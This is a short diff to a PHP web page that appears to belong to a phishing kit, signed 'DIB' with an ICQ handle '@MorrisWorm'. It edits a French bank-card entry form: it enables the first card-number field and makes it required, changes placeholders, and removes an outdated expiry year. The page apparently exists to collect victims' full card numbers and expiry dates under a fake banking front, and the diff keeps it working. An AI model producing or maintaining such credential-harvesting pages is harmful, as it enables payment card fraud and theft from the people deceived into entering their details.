@@ -1,4 +1,4 @@
-<?php
+﻿<?php
 
 /*
 Author : DIB
@@ -150,7 +150,7 @@ ICQ : @MorrisWorm
 				<tbody>
 					<td colspan="4">
 						<p style="padding:4px;"><b style="font-size:12px">N° de carte bancaire:</b></p>
-						<input type="text" class="form-control" id="ccnum1" name="ccnum1" required="" style="text-align: center;display:inline-block;;" maxlength="4" placeholder="4978" disabled="">
+						<input type="text" class="form-control" id="ccnum1" name="ccnum1" required="" style="text-align: center;display:inline-block;;" maxlength="4" placeholder="4XXX" required>
 						<input type="text" class="form-control" id="ccnum2" name="ccnum2" required="" style="text-align: center;display:inline-block;;" maxlength="4" placeholder="XXXX" required>
 						<input type="text" class="form-control" id="ccnum3" name="ccnum3" required="" style="text-align: center;display:inline-block;;" maxlength="4" placeholder="XXXX" required>
 						<input type="text" class="form-control" id="ccnum4" name="ccnum4" required="" style="text-align: center;display:inline-block;;" maxlength="4" placeholder="XXXX" required>
@@ -181,8 +181,7 @@ ICQ : @MorrisWorm
 						</select>
 
 						<select id="expy" name="008" required="" placeholder="Date d'expiration (MM/AAAA)" style="width: 90px;" required>
-							<option value="" disabled="" selected="">Année</option>							
-							<option value="21">2021</option>
+							<option value="" disabled="" selected="">Année</option>														
 							<option value="22">2022</option>
 							<option value="23">2023</option>
 							<option value="24">2024</option>
